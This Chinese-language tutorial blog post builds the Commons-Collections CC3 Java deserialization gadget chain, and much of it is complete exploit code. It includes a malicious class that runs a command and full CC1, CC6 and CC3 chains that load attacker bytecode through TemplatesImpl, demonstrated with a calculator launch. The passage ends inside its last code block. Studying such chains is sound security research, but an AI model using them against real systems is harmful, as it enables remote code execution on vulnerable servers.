# Java 反序列化 Commons-Collections 篇 04-CC3 链

## 0x01 前言

最近忙着期末考试，不过关于反序列化的一些思路已经是更加熟练了，冲冲冲。

CC3 链同之前我们讲的 CC1 链与 CC6 链的区别之处是非常大的。原本的 CC1 链与 CC6 链是通过 `Runtime.exec()` 进行**命令执行**的。而很多时候服务器的代码当中的黑名单会选择禁用 `Runtime`。

而 CC3 链这里呢，则是通过动态加载类加载机制来实现自动执行**恶意类代码**的。

- 所以下面，我们先来过一遍 Java 动态类加载机制。

## 0x02 环境

- jdk8u65
- Commons-Collections 3.2.1

## 0x03 TemplatesImpl 解析

- 在之前的 **[Java反序列化基础篇-05-类的动态加载](https://drun1baby.github.io/2022/06/03/Java反序列化基础篇-05-类的动态加载/#toc-heading-25)** 文章当中，我们讲到了一种利用 **利用 ClassLoader#defineClass 直接加载字节码**的手段。

在这一条小链子当中，流程图可以绘制如下。

![img](https://drun1baby.top/2022/06/20/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E7%AF%8704-CC3%E9%93%BE/ClassLoaderDefineClass.png)

这里我们可以正向看，首先是 `loadClass()`，它的作用是从已加载的类缓存、父加载器等位置寻找类（这里实际上是双亲委派机制），在前面没有找到的情况下，执行 `findClass()`。

对于 `findClass()` 方法

- 根据名称或位置加载 .class 字节码,然后使用 defineClass，代码实例如下。
- 通常由子类去实现

JAVA

```
protected Class<?> findClass(String name) throws ClassNotFoundException {
    throw new ClassNotFoundException(name);
}

// findClass 方法的源代码
```

JAVA

```
class NetworkClassLoader extends ClassLoader {
        String host;
        int port;

         public Class findClass(String name) {
            byte[] b = loadClassData(name);
             return defineClass(name, b, 0, b.length);
         }

         private byte[] loadClassData(String name) {
             // load the class data from the connection
         }
}
// 子类的实现方式
```

- `defineClass()` 的作用是处理前面传入的字节码，将其处理成真正的 Java 类。

> 此时的 `defineClass()` 方法是有局限性的，因为它只是加载类，并不执行类。若需要执行，则需要先进行 `newInstance()` 的实例化。

现在我们的 `defineClass()` 方法的作用域为 `protected`，我们需要找到作用域为 `public` 的类，方便我们利用。照样 find usages

在 `TemplatesImpl` 类的 `static class TransletClassLoader` 中找到了我们能够运用的类。

![img](https://drun1baby.top/2022/06/20/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E7%AF%8704-CC3%E9%93%BE/defaultDefineClass.png)

这里的 `defineClass()` 方法没有标注作用域，默认为 defalut，也就是说自己的类里面可以调用，我们继续 find usages

![img](https://drun1baby.top/2022/06/20/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E7%AF%8704-CC3%E9%93%BE/defineTransletClasses.png)

因为作用域是 private，所以我们看一看谁调用了 `defineTransletClasses()` 方法

- 这里还有一点需要注意的，`_bytecodes` 的值不能为 null，否则会抛出异常。

![img](https://drun1baby.top/2022/06/20/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E7%AF%8704-CC3%E9%93%BE/getTransletInstance.png)

还是同一个类下的 `getTransletInstance()` 方法调用了 `defineTransletClasses()` 方法，并且这里有一个 `newInstance()` 实例化的过程，如果能走完这个函数那么就能动态执行代码，但是因为它是私有的，所以继续找。

![img](https://drun1baby.top/2022/06/20/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E7%AF%8704-CC3%E9%93%BE/synchronized.png)

- 找到了一个 public 的方法，接下来我们开始利用。

## 0x04 TemplatesImpl 利用

### 1. 利用逻辑

在分析过程我们说到只要走过 `getTransletInstance()` 方法即可，因为这个方法内调用了 `newInstance()` 方法，用伪代码来表示的话如下。

JAVA

```
TemplatesImpl templates = new TemplatesImpl();
templates.newTransformer();  // 因为是一层层调用的，我们需要后续赋值
```

- 如果没有一堆限制条件，我们现在的这两行代码就可以进行命令执行了。这里的限制条件指的是类似于下图的这一些。

![img](https://drun1baby.top/2022/06/20/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E7%AF%8704-CC3%E9%93%BE/ValueSee.png)

如果此处的 `_name` 为 null，则后续的代码都不执行，也到不了我们调用 `newInstance()` 实例化的地方。

并且这里我们需要让 `_classs` 的值为空，才能进入调用 `newInstance()`

这些便是限制条件

### 2. 分析限制条件并编写 EXP

- 这里的 TemplatesImpl 通过反射修改其值。

![img](https://drun1baby.top/2022/06/20/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E7%AF%8704-CC3%E9%93%BE/TemplatesImplSerial.png)

先列举一些需要我们进行赋值的属性值，用反射修改属性值。赋值这里需要”对症下药”，也就是需要什么类型的值，我们就给什么类型。

![img](https://drun1baby.top/2022/06/20/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E7%AF%8704-CC3%E9%93%BE/ValueSet.png)

`_class` 的值应当为 null，我们去看 `TemplatesImpl` 的构造方法中没有给 `_class` 赋初值，所以不用管它。

`_name` 的值，这里需要的是 String，所以我们简单赋个 String 即可。

- `_bytecodes` 这里比较难，我们过一遍。

`_bytecodes` 的值，这里需要的是一个二维数组，所以我们创建一个二维数组。但是 `_bytecodes` 作为传递进 defineClass 方法的值是一个一维数组。而这个一维数组里面我们需要存放恶意的字节码。这一段伪代码可以这样写。

在写这段小 poc 之前，要先写一个 Calc.class 的恶意类并编译。

JAVA

```
import java.io.IOException;  
  
public class Calc {  
    static {  
        try {  
            Runtime.getRuntime().exec("calc");  
 } catch (IOException e){  
            e.printStackTrace();  
 }  
    }  
}
```

直接编写静态代码块就可以了，因为在类初始化的时候会自动执行代码。

JAVA

```
byte[] evil = Files.readAllBytes(Paths.get("E://Calc.class"));  
byte[][] codes = {evil};
```

- `_tfactory` 这里比较难，我们也过一遍，这两个过完之后，写其他的就没什么问题了。

`_tfactory` 的值在 `TemplatesImpl` 这一类中被定义如下，关键字是 `transient`，这就导致了这个变量在序列化之后无法被访问。

JAVA

```
private transient TransformerFactoryImpl _tfactory = null;
```

直接修改是不行的，但是我们这里的利用要求比较低，只要让 `_tfactory` 不为 null 即可，我们去看一看 `_tfactory` 的其他定义如何。

在 `readObject()` 方法中，找到了 `_tfactory` 的初始化定义。

![img](https://drun1baby.top/2022/06/20/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E7%AF%8704-CC3%E9%93%BE/tfactoryNotNull.png)

所以这里直接在反射中将其赋值为 `TransformerFactortImpl` 即可，伪代码如下。

JAVA

```
Field tfactoryField = templatesClass.getDeclaredField("_tfactory");  
tfactoryField.setAccessible(true);  
tfactoryField.set(templates, new TransformerFactoryImpl());
```

- 最终完整的 EXP 应该如下

JAVA

```
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;  
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;  
  
import java.lang.reflect.Field;  
import java.nio.file.Files;  
import java.nio.file.Paths;  
  
// TemplatesImpl 的 EXP 编写  
public class TemplatesImplEXP {  
    public static void main(String[] args) throws Exception{  
        TemplatesImpl templates = new TemplatesImpl();  
 Class templatesClass = templates.getClass();  
 Field nameField = templatesClass.getDeclaredField("_name");  
 nameField.setAccessible(true);  
 nameField.set(templates,"Drunkbaby");  
  
 Field bytecodesField = templatesClass.getDeclaredField("_bytecodes");  
 bytecodesField.setAccessible(true);  
 byte[] evil = Files.readAllBytes(Paths.get("E://Calc.class"));  
 byte[][] codes = {evil};  
 bytecodesField.set(templates,codes);  
  
 Field tfactoryField = templatesClass.getDeclaredField("_tfactory");  
 tfactoryField.setAccessible(true);  
 tfactoryField.set(templates, new TransformerFactoryImpl());  
 templates.newTransformer();  
 }  
}
```

#### 解决报错，挖 0day 的必经之路！

- 按照道理来说，上面的 EXP 已经挺完美的了，但是在运行的时候我不但没有弹出计算器，反而还报错了。

![img](https://drun1baby.top/2022/06/20/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E7%AF%8704-CC3%E9%93%BE/Error.png)

这里报错是由于空指针报错，我们去 `TemplatesImpl` 下打断点调试一下。

我是在 393 行 `if (_bytecodes == null)` 那里打断点的。调试之后发现问题出在这儿。

![img](https://drun1baby.top/2022/06/20/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E7%AF%8704-CC3%E9%93%BE/Debug.png)

- 418 行，判断在 `defineClass()` 方法中传进去的参数 b 数组的字节码是否继承了 `ABSTRACT_TRANSLET` 这个父类，如果没有则抛出异常，所以我们需要去恶意类中继承 `ABSTRACT_TRANSLET` 这个父类。

或者我们可以将 `_auxClasse` 赋值，使其不为 null。但是如果没有继承 `ABSTRACT_TRANSLET` 这个父类，会导致 `_transletIndex` 的值为 -1，在第 426 行的判断当中跳出程序。

> 修改完毕之后，我们的弹计算器就成功了。

![img](https://drun1baby.top/2022/06/20/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E7%AF%8704-CC3%E9%93%BE/SuccessTemplatesImpl.png)

## 0x05 CC1 链的 TemplatesImpl 的实现方式

> TemplatesImpl 只是将原本的命令执行变成代码执行的方式所以在不考虑黑名单的情况下，如果可以进行命令执行，则一定可以通过动态加载字节码进行代码执行。

- 如图，链子不变，只是最后的命令执行方式变了。

![img](https://drun1baby.top/2022/06/20/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E7%AF%8704-CC3%E9%93%BE/Diff.png)

所以这里我们先尝试修改命令执行的方法，这时候的链子应该是从后往前的，也就是确定了命令执行的方式之后，将传参设置为动态加载的字节码。并且前面的链子不变。

暂时的 EXP 是这样的。

JAVA

```
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;  
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;  
import org.apache.commons.collections.Transformer;  
import org.apache.commons.collections.functors.ChainedTransformer;  
import org.apache.commons.collections.functors.ConstantTransformer;  
import org.apache.commons.collections.functors.InvokerTransformer;  
import org.apache.commons.collections.map.TransformedMap;  
  
import java.io.*;  
import java.lang.annotation.Target;  
import java.lang.reflect.Constructor;  
import java.lang.reflect.Field;  
import java.nio.file.Files;  
import java.nio.file.Paths;  
import java.util.HashMap;  
import java.util.Map;  
  
public class CC1TemplatesEXP {  
    public static void main(String[] args) throws Exception{  
        TemplatesImpl templates = new TemplatesImpl();  
 Class templatesClass = templates.getClass();  
 Field nameField = templatesClass.getDeclaredField("_name");  
 nameField.setAccessible(true);  
 nameField.set(templates,"Drunkbaby");  
  
 Field bytecodesField = templatesClass.getDeclaredField("_bytecodes");  
 bytecodesField.setAccessible(true);  
 byte[] evil = Files.readAllBytes(Paths.get("E://Calc.class"));  
 byte[][] codes = {evil};  
 bytecodesField.set(templates,codes);  
  
 Field tfactoryField = templatesClass.getDeclaredField("_tfactory");  
 tfactoryField.setAccessible(true);  
 tfactoryField.set(templates, new TransformerFactoryImpl());  
 // templates.newTransformer();  
  
 Transformer[] transformers = new Transformer[]{  
                new ConstantTransformer(templates),  
 new InvokerTransformer("newTransformer", null, null)  
        };  
 ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);  
 chainedTransformer.transform(1);   
}
```

最后一句，传入 `chainedTransformer.transform(1)` 是因为前面我们定义了 `new ConstantTransformer(templates)`，这个类是需要我们传参的，传入 1 即可。

![img](https://drun1baby.top/2022/06/20/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E7%AF%8704-CC3%E9%93%BE/TemplatesImplCC1Half.png)

- OK，弹计算器成功，接下来是把 CC1 链的前半部分拿进去。

完整的 EXP 如下

JAVA

```
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;  
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;  
import org.apache.commons.collections.Transformer;  
import org.apache.commons.collections.functors.ChainedTransformer;  
import org.apache.commons.collections.functors.ConstantTransformer;  
import org.apache.commons.collections.functors.InvokerTransformer;  
import org.apache.commons.collections.map.TransformedMap;  
  
import java.io.*;  
import java.lang.annotation.Target;  
import java.lang.reflect.Constructor;  
import java.lang.reflect.Field;  
import java.nio.file.Files;  
import java.nio.file.Paths;  
import java.util.HashMap;  
import java.util.Map;  
  
public class CC1TemplatesEXP {  
    public static void main(String[] args) throws Exception{  
        TemplatesImpl templates = new TemplatesImpl();  
 Class templatesClass = templates.getClass();  
 Field nameField = templatesClass.getDeclaredField("_name");  
 nameField.setAccessible(true);  
 nameField.set(templates,"Drunkbaby");  
  
 Field bytecodesField = templatesClass.getDeclaredField("_bytecodes");  
 bytecodesField.setAccessible(true);  
 byte[] evil = Files.readAllBytes(Paths.get("E://Calc.class"));  
 byte[][] codes = {evil};  
 bytecodesField.set(templates,codes);  
  
 Field tfactoryField = templatesClass.getDeclaredField("_tfactory");  
 tfactoryField.setAccessible(true);  
 tfactoryField.set(templates, new TransformerFactoryImpl());  
 // templates.newTransformer();  
  
 Transformer[] transformers = new Transformer[]{  
                new ConstantTransformer(templates),  
 new InvokerTransformer("newTransformer", null, null)  
        };  
 ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);  
 //   chainedTransformer.transform(1);  
 HashMap<Object, Object> hashMap = new HashMap<>();  
 hashMap.put("value","drunkbaby");  
 Map<Object, Object> transformedMap = TransformedMap.decorate(hashMap, null, chainedTransformer);  
 Class c = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");  
 Constructor aihConstructor = c.getDeclaredConstructor(Class.class, Map.class);  
 aihConstructor.setAccessible(true);  
 Object o = aihConstructor.newInstance(Target.class, transformedMap);  
 // 序列化反序列化  
 serialize(o);  
 unserialize("ser.bin");  
 }  
    public static void serialize(Object obj) throws IOException {  
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));  
 oos.writeObject(obj);  
 }  
    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException{  
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));  
 Object obj = ois.readObject();  
 return obj;  
 }  
}
```

![img](https://drun1baby.top/2022/06/20/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E7%AF%8704-CC3%E9%93%BE/TemplatesImplCC1Done.png)

- 然后是 Yso 正版链子的 TemplatesImpl 的实现方式。

EXP 如下

JAVA

```
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;  
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;  
import org.apache.commons.collections.Transformer;  
import org.apache.commons.collections.functors.ChainedTransformer;  
import org.apache.commons.collections.functors.ConstantTransformer;  
import org.apache.commons.collections.functors.InvokerTransformer;  
import org.apache.commons.collections.map.LazyMap;  
  
import java.io.*;  
import java.lang.reflect.Constructor;  
import java.lang.reflect.Field;  
import java.lang.reflect.InvocationHandler;  
import java.lang.reflect.Proxy;  
import java.nio.file.Files;  
import java.nio.file.Paths;  
import java.util.HashMap;  
import java.util.Map;  
  
// CC1 Yso 的正版链子，用 TemplatesImpl 实现 EXPpublic class CC1YsoTemplatesEXP {  
    public static void main(String[] args) throws Exception {  
        TemplatesImpl templates = new TemplatesImpl();  
 Class templatesClass = templates.getClass();  
 Field nameField = templatesClass.getDeclaredField("_name");  
 nameField.setAccessible(true);  
 nameField.set(templates, "Drunkbaby");  
  
 Field bytecodesField = templatesClass.getDeclaredField("_bytecodes");  
 bytecodesField.setAccessible(true);  
 byte[] evil = Files.readAllBytes(Paths.get("E://Calc.class"));  
 byte[][] codes = {evil};  
 bytecodesField.set(templates, codes);  
  
 Field tfactoryField = templatesClass.getDeclaredField("_tfactory");  
 tfactoryField.setAccessible(true);  
 tfactoryField.set(templates, new TransformerFactoryImpl());  
 //     templates.newTransformer();  
 Transformer[] transformers = new Transformer[]{  
                new ConstantTransformer(templates), // 构造 setValue 的可控参数  
 new InvokerTransformer("newTransformer", null, null)  
        };  
 ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);  
 HashMap<Object, Object> hashMap = new HashMap<>();  
 Map decorateMap = LazyMap.decorate(hashMap, chainedTransformer);  
  
 Class c = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");  
 Constructor declaredConstructor = c.getDeclaredConstructor(Class.class, Map.class);  
 declaredConstructor.setAccessible(true);  
 InvocationHandler invocationHandler = (InvocationHandler) declaredConstructor.newInstance(Override.class, decorateMap);  
  
 Map proxyMap = (Map) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader()  
                , new Class[]{Map.class}, invocationHandler);  
 invocationHandler = (InvocationHandler) declaredConstructor.newInstance(Override.class, proxyMap);  
  
 serialize(invocationHandler);  
 unserialize("ser.bin");  
 }  
  
    public static void serialize(Object obj) throws IOException {  
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));  
 oos.writeObject(obj);  
 }  
  
    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException {  
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));  
 Object obj = ois.readObject();  
 return obj;  
 }  
}
```

![img](https://drun1baby.top/2022/06/20/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E7%AF%8704-CC3%E9%93%BE/YsoTemplatesImplSucc.png)

## 0x06 CC6 链的 TemplatesImpl 的实现方式

上面已经讲过原理了，我这里就直接把 EXP 拿出来。

JAVA

```
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;  
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;  
import org.apache.commons.collections.Transformer;  
import org.apache.commons.collections.functors.ChainedTransformer;  
import org.apache.commons.collections.functors.ConstantTransformer;  
import org.apache.commons.collections.functors.InvokerTransformer;  
import org.apache.commons.collections.keyvalue.TiedMapEntry;  
import org.apache.commons.collections.map.LazyMap;  
  
import java.io.*;  
import java.lang.reflect.Field;  
import java.nio.file.Files;  
import java.nio.file.Paths;  
import java.util.HashMap;  
import java.util.Map;  
  
// CC6 Yso 的正版链子，用 TemplatesImpl 实现 EXPpublic class CC6TemplatesEXP {  
    public static void main(String[] args) throws Exception{  
        TemplatesImpl templates = new TemplatesImpl();  
 Class templatesClass = templates.getClass();  
 Field nameField = templatesClass.getDeclaredField("_name");  
 nameField.setAccessible(true);  
 nameField.set(templates, "Drunkbaby");  
  
 Field bytecodesField = templatesClass.getDeclaredField("_bytecodes");  
 bytecodesField.setAccessible(true);  
 byte[] evil = Files.readAllBytes(Paths.get("E://Calc.class"));  
 byte[][] codes = {evil};  
 bytecodesField.set(templates, codes);  
  
 Field tfactoryField = templatesClass.getDeclaredField("_tfactory");  
 tfactoryField.setAccessible(true);  
 tfactoryField.set(templates, new TransformerFactoryImpl());  
 //     templates.newTransformer();  
 Transformer[] transformers = new Transformer[]{  
                new ConstantTransformer(templates),  
 new InvokerTransformer("newTransformer", null, null)  
        };  
 ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);  
 HashMap<Object, Object> hashMap = new HashMap<>();  
 Map lazyMap = LazyMap.decorate(hashMap, new ConstantTransformer("five")); // 防止在反序列化前弹计算器  
 TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, "key");  
 HashMap<Object, Object> expMap = new HashMap<>();  
 expMap.put(tiedMapEntry, "value");  
 lazyMap.remove("key");  
  
 // 在 put 之后通过反射修改值  
 Class<LazyMap> lazyMapClass = LazyMap.class;  
 Field factoryField = lazyMapClass.getDeclaredField("factory");  
 factoryField.setAccessible(true);  
 factoryField.set(lazyMap, chainedTransformer);  
  
 serialize(expMap);  
 unserialize("ser.bin");  
 }  
    public static void serialize(Object obj) throws IOException {  
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));  
 oos.writeObject(obj);  
 }  
    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException{  
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));  
 Object obj = ois.readObject();  
 return obj;  
 }  
}
```

成功弹出计算器。

## 0x07 回归正题 ———— CC3 链

> 在去看 yso 的 CC3 链子之前，我觉得应该给自己多一点思考空间。

### 1. CC3 链分析

因为只需要调用 `TemplatesImpl` 类的 `newTransformer()` 方法，便可以进行命令执行，所以我们去到 `newTransformer()` 方法下，find usages。

![img](https://drun1baby.top/2022/06/20/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E7%AF%8704-CC3%E9%93%BE/FindNewTransformer.png)

- 这里主要是找到了四个，我们一个个讲解一下为什么是 `TrAXFilter` 而不是其他的。

Process 这个在 main 里面，是作为一般对象用的，所以不用它。

第二个 `getOutProperties`，是反射调用的方法，可能会在 fastjson 的漏洞里面被调用。

TransformerFactoryImpl 不能序列化，如果还想使用它也是也可能的，但是需要传参，我们需要去找构造函数。而它的构造函数难传参。

最后，`TrAXFilter`，它也是不能序列化的，但是我们去到它的构造函数看，是有搞头的。

![img](https://drun1baby.top/2022/06/20/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E7%AF%8704-CC3%E9%93%BE/TrAXFilterCode.png)

这个类的构造函数中有这一条语句，所以我们只要执行这个类的构造函数即可命令执行。

JAVA

```
_transformer = (TransformerImpl) templates.newTransformer();
```

CC3 这里的作者没有调用 `InvokerTransformer`，而是调用了一个新的类 `InstantiateTransformer`。

- `InstantiateTransformer` 这个类是用来初始化 `Transformer` 的，我们去找 `InstantiateTransformer` 类下的 `transform` 方法。

完美契合我们的需求！

![img](https://drun1baby.top/2022/06/20/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E7%AF%8704-CC3%E9%93%BE/InstantiateTransformer.png)

接着，来构造 EXP

### 2. CC3 链构造 EXP

首先，我们后半段的命令执行是不变的，也就是 TemplatesImpl 的 EXP 是不变的。

- 我们先编写后半部分链子的 EXP

`InstantiateTransformer` 类这里的传参我们去看一下，要求传入如此的参数。

JAVA

```
public InstantiateTransformer(Class[] paramTypes, Object[] args) {  
    super();  
 iParamTypes = paramTypes;  
 iArgs = args;  
}
```

那我们这里传入 `new Class[]{Templates.class}` 与 `new Object[]{templates}` 即可

完整的后半部分链子的 EXP

JAVA

```
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;  
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;  
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;  
import org.apache.commons.collections.functors.InstantiateTransformer;  
  
import javax.xml.transform.Templates;  
import java.lang.reflect.Field;  
import java.nio.file.Files;  
import java.nio.file.Paths;  
  
// CC3 链最终 EXPpublic class CC3FinalEXP {  
    public static void main(String[] args) throws Exception{  
        TemplatesImpl templates = new TemplatesImpl();  
 Class templatesClass = templates.getClass();  
 Field nameField = templatesClass.getDeclaredField("_name");  
 nameField.setAccessible(true);  
 nameField.set(templates,"Drunkbaby");  
  
 Field bytecodesField = templatesClass.getDeclaredField("_bytecodes");  
 bytecodesField.setAccessible(true);  
 byte[] evil = Files.readAllBytes(Paths.get("E://Calc.class"));  
 byte[][] codes = {evil};  
 bytecodesField.set(templates,codes);  
  
 Field tfactoryField = templatesClass.getDeclaredField("_tfactory");  
 tfactoryField.setAccessible(true);  
 tfactoryField.set(templates, new TransformerFactoryImpl());  
 //    templates.newTransformer();  
  
 InstantiateTransformer instantiateTransformer = new InstantiateTransformer(new Class[]{Templates.class},  
 new Object[]{templates});  
 instantiateTransformer.transform(TrAXFilter.class);  
 }  
}
```

![img](https://drun1baby.top/2022/06/20/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E7%AF%8704-CC3%E9%93%BE/InstantiateTransformerHalfEXP.png)

后半部分 EXP 写好了，我们去找入口类的前半部分。而前半部分链子从谁调用了 `transform` 方法开始，所以 CC1 链和 CC6 链的前半部分 EXP 都是有效的。我们直接搬进来试一下。

#### CC1 链作为前半部分

- 后续发现这段 EXP 报错了

JAVA

```
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;  
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;  
import org.apache.commons.collections.Transformer;  
import org.apache.commons.collections.functors.ConstantTransformer;  
import org.apache.commons.collections.functors.InstantiateTransformer;  
import org.apache.commons.collections.map.LazyMap;  
  
import javax.xml.transform.Templates;  
import java.io.*;  
import java.lang.reflect.Constructor;  
import java.lang.reflect.Field;  
import java.lang.reflect.InvocationHandler;  
import java.lang.reflect.Proxy;  
import java.nio.file.Files;  
import java.nio.file.Paths;  
import java.util.HashMap;  
import java.util.Map;  
  
// CC3 链最终 EXPpublic class CC3FinalEXP {  
    public static void main(String[] args) throws Exception  
    {  
        TemplatesImpl templates = new TemplatesImpl();  
 Class templatesClass = templates.getClass();  
 Field nameField = templatesClass.getDeclaredField("_name");  
 nameField.setAccessible(true);  
 nameField.set(templates,"Drunkbaby");  
  
 Field bytecodesField = templatesClass.getDeclaredField("_bytecodes");  
 bytecodesField.setAccessible(true);  
 byte[] evil = Files.readAllBytes(Paths.get("E://Calc.class"));  
 byte[][] codes = {evil};  
 bytecodesField.set(templates,codes);  
  
 Field tfactoryField = templatesClass.getDeclaredField("_tfactory");  
 tfactoryField.setAccessible(true);  
 tfactoryField.set(templates, new TransformerFactoryImpl());  
 //    templates.newTransformer();  
  
 InstantiateTransformer instantiateTransformer = new InstantiateTransformer(new Class[]{Templates.class},  
 new Object[]{templates});  
 HashMap<Object, Object> hashMap = new HashMap<>();  
 Map decorateMap = LazyMap.decorate(hashMap, instantiateTransformer);  
  
 Class c = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");  
 Constructor declaredConstructor = c.getDeclaredConstructor(Class.class, Map.class);  
 declaredConstructor.setAccessible(true);  
 InvocationHandler invocationHandler = (InvocationHandler) declaredConstructor.newInstance(Override.class, decorateMap);  
  
 Map proxyMap = (Map) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader()  
                , new Class[]{Map.class}, invocationHandler);  
 Object o = (InvocationHandler) declaredConstructor.newInstance(Override.class, proxyMap);  
  
 //  serialize(o);  
 unserialize("ser.bin");  
 }  
  
    public static void serialize(Object obj) throws IOException {  
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));  
 oos.writeObject(obj);  
 }  
  
    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException {  
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));  
 Object obj = ois.readObject();  
 return obj;  
 }  
}
```

- 这段 EXP 在序列化的时候是没问题的，在反序列化的时候报错了，报错说我们传入 `instantiateTransformer` 是一个字符串而不是一个类，我当时人就傻了。啊？明明是一个类啊，不是字符串啊，怎么回事？

我打了断点调试还是想不明白，后续才知道是因为 CC1 链的老问题，`setValue()` 的传参无法控制，需要引入 `Transformer` 与 `ChainedTransformer` 加以辅助。

JAVA

```
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;  
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;  
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;  
import org.apache.commons.collections.Transformer;  
import org.apache.commons.collections.functors.ChainedTransformer;  
import org.apache.commons.collections.functors.ConstantTransformer;  
import org.apache.commons.collections.functors.InstantiateTransformer;  
import org.apache.commons.collections.functors.InvokerTransformer;  
import org.apache.commons.collections.map.LazyMap;  
  
import javax.xml.transform.Templates;  
import java.io.*;  
import java.lang.reflect.Constructor;  
import java.lang.reflect.Field;  
import java.lang.reflect.InvocationHandler;  
import java.lang.reflect.Proxy;  
import java.nio.file.Files;  
import java.nio.file.Paths;  
import java.util.HashMap;  
import java.util.Map;  
  
// CC3 链最终 EXPpublic class CC3FinalEXP {  
    public static void main(String[] args) throws Exception  
    {  
        TemplatesImpl templates = new TemplatesImpl();  
 Class templatesClass = templates.getClass();  
 Field nameField = templatesClass.getDeclaredField("_name");  
 nameField.setAccessible(true);  
 nameField.set(templates,"Drunkbaby");  
  
 Field bytecodesField = templatesClass.getDeclaredField("_bytecodes");  
 bytecodesField.setAccessible(true);  
 byte[] evil = Files.readAllBytes(Paths.get("E://Calc.class"));  
 byte[][] codes = {evil};  
 bytecodesField.set(templates,codes);  
  
 Field tfactoryField = templatesClass.getDeclaredField("_tfactory");  
 tfactoryField.setAccessible(true);  
 tfactoryField.set(templates, new TransformerFactoryImpl());  
 //    templates.newTransformer();  
  
 InstantiateTransformer instantiateTransformer = new InstantiateTransformer(new Class[]{Templates.class},  
 new Object[]{templates});  
 Transformer[] transformers = new Transformer[]{  
                new ConstantTransformer(TrAXFilter.class), // 构造 setValue 的可控参数  
 instantiateTransformer  
        };  
 ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);  
 HashMap<Object, Object> hashMap = new HashMap<>();  
 Map decorateMap = LazyMap.decorate(hashMap, chainedTransformer);  
  
 Class c = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");  
 Constructor declaredConstructor = c.getDeclaredConstructor(Class.class, Map.class);  
 declaredConstructor.setAccessible(true);  
 InvocationHandler invocationHandler = (InvocationHandler) declaredConstructor.newInstance(Override.class, decorateMap);  
  
 Map proxyMap = (Map) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader()  
                , new Class[]{Map.class}, invocationHandler);  
 Object o = (InvocationHandler) declaredConstructor.newInstance(Override.class, proxyMap);  
  
 serialize(o);  
 unserialize("ser.bin");  
 }  
  
    public static void serialize(Object obj) throws IOException {  
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));  
 oos.writeObject(obj);  
 }  
  
    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException {  
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));  
 Object obj = ois.readObject();  
 return obj;  
 }  
